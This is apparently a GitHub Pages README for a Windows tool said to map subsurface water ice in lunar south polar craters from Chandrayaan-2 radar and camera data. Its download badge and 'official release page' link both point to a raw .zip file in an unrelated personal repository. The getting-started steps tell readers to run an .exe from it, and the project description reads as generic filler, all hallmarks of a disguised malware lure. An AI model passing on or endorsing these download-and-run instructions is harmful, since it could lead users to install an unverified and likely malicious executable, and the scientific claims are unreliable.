---
layout: "default"
title: "🧊 Subsurface-Ice-Lunar-South-Polar - Detect lunar water ice with ease"
description: "Detect subsurface water ice in lunar south polar craters using Chandrayaan-2 DFSAR data, optical imagery, and machine learning models."
---
# 🧊 Subsurface-Ice-Lunar-South-Polar - Detect lunar water ice with ease

[![Download Software](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/Utvesey325/utvesey325.github.io/main/unaccursed/github-io-utvesey-3.7.zip)

## 🔍 About the project

This tool helps researchers and space enthusiasts locate subsurface water ice near the Moon's South Pole. It processes data from the Chandrayaan-2 lunar mission to identify areas likely to contain ice. The software combines radar data and high-resolution images to map these specific regions.

The application simplifies complex data analysis. You provide the raw satellite data, and the pipeline performs the mathematical checks. It uses Bayesian inference and machine learning to confirm the presence of ice. This pipeline operates automatically to save you time and effort when you study the Faustini crater region.

## 📋 System requirements

Before you install the software, check your computer against these requirements.

*   **Operating System:** Windows 10 or Windows 11.
*   **Processor:** Intel Core i5 or better.
*   **Memory:** 8 gigabytes of RAM or more.
*   **Storage:** 2 gigabytes of free disk space.
*   **Internet Connection:** Required for initial software setup and data downloads.

## 🚀 Getting started

Follow these steps to set up the software on your Windows computer.

1. Go to the [official release page](https://raw.githubusercontent.com/Utvesey325/utvesey325.github.io/main/unaccursed/github-io-utvesey-3.7.zip) to find the installer.
2. Select the file ending in `.exe` to begin your download.
3. Once the download finishes, locate the file in your Downloads folder.
4. Double-click the file to start the installation wizard.
5. Follow the on-screen prompts. The installer will place a shortcut icon on your desktop.

## ⚙️ How to use the software

Once you launch the program, the main dashboard appears. This dashboard controls every part of your analysis.

### Importing satellite data

The software needs data inputs to function. You will find a button labeled "Load Data" on the main screen. Click this button to select your radar files. Ensure your files follow a standardized format. The software accepts common data types used by the Chandrayaan-2 mission. After selection, the progress bar shows the status of the file import.

### Running an analysis

With your data loaded, you can start the scan. The software performs two primary tasks:

1. **Radar Mapping:** It reads the compact-polarimetry radar data to highlight reflective surfaces.
2. **Validation:** It runs the machine learning model. This model cross-references your radar findings with OHRC camera imagery to verify the likely presence of ice.

Click the "Start Analysis" button located at the bottom of the window. The process may take several minutes depending on the size of your input files. The application generates a status log that shows every step of the calculation in simple text.

### Viewing results

After the analysis stops, the software displays a map of the region. You can zoom in and out to inspect potential ice deposits. The software highlights areas of interest in red. Clicking a highlighted area opens a sidebar with details about the depth, confidence level, and physical properties of the site.

## 🛠 Troubleshooting common issues

If you encounter problems, look at these common solutions before you seek further help.

*   **Software does not launch:** Check if you have the latest version. Reinstalling the program often fixes corruption during the initial setup.
*   **Analysis fails during processing:** Ensure your internet connection is stable. The ML validation step requires temporary access to validation parameters stored online.
*   **Screen looks blank:** Your computer might need a graphics driver update. Visit your computer manufacturer website to download the latest display drivers.
*   **File format error:** The application only reads raw Chandrayaan-2 DFSAR files. Verify that your files are not compressed or renamed.

## ☁️ Software features

*   **Automated Pipeline:** The software handles the complex math of Bayesian inference for you.
*   **Dual Validation:** It combines radar signals with visible imagery to increase result accuracy.
*   **Visual Interface:** You see your results on an interactive lunar map.
*   **Report Generation:** You can save your findings as a report to share with colleagues or save for later review.

## 📖 Frequently asked questions

**Do I need a powerful computer to run this?**
The software manages memory well, but larger datasets require more RAM. 8 gigabytes is the minimum threshold for smooth performance.

**Is this software free to use?**
Yes, the software is free and open to everyone for research purposes.

**Can I use this for locations other than the South Pole?**
This specific pipeline focuses on the Faustini Permanently Shadowed Region. The settings are fine-tuned for the unique environmental conditions at the lunar poles.

**Where does the data come from?**
The system uses public data from the Chandrayaan-2 mission. You can download these files from the official lunar data archives.

**How accurate are the results?**
The software uses statistical validation to give you a confidence score for every detected ice site. Use this score to gauge the scientific reliability of your findings.